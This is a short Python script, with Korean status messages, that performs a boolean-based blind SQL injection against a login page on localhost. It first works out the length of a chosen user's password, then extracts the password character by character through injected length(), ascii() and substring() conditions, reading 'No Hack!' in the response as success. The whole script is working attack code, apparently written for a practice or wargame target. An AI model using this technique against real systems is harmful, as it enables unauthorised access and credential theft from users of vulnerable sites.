import requests
import os
url = "http://localhost:8080/logincheck.php"

response = requests.get(url)

if response.status_code == 200:
    print(url + " 연결 성공")



username = input("UserID : ")

i=1
password_len = 0
while True:
    url_len = url + "?user_id="+ username + "' and length(user_password)=" + str(i) + "%23"
    print(url_len)
    req = requests.get(url_len)
    if -1 != req.text.find("No Hack!"):
        print("Success!")
        password_len = i
        break
    else :
        print("Fail!")
        i+=1

print("=" * 100)

password = ''
for i in range(1, password_len+1):
    for j in range(33, 127):
        url_password = url + "?user_id=" + username + "' and ascii(substring(user_password," + str(i) + ", 1))=" + str(j) + "%23"
        print(url_password)
        req = requests.get(url_password)
        if -1 != req.text.find("No Hack!"):
            print("Success!")
            print(chr(j))
            password += chr(j)
        else:
            print("Fail!")

print("Password Length →",password_len)
print("Password → " + password)
os.system('pause')







    



    

